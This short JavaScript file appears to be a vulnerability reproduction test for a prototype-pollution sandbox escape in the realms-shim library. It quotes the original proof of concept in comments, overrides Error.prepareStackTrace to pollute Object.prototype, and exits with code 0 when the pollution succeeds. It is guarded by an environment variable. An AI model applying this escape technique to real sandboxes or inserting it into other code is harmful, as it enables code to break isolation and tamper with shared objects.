if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

// Original sample:
//   import Realm from 'realms-shim'
//
//   let realm = Realm.makeRootRealm();
//   try {
//   	realm.evaluate(`
//   		Error.prepareStackTrace = function(e, st) {
//   			st.__proto__.__proto__.polluted = 'success'
//   		};
//   		x;`);
//   } catch(e) {
//   	// we do not even need to print e
//   }

process.on("uncaughtException", (error) => {
	console.error(error);
	if ({}.polluted === "success") {
		process.exit(0);
	}

	process.exit(82);
});

Error.prepareStackTrace = function (e, st) {
	e.__proto__.__proto__.__proto__.polluted = "success";
};
x;
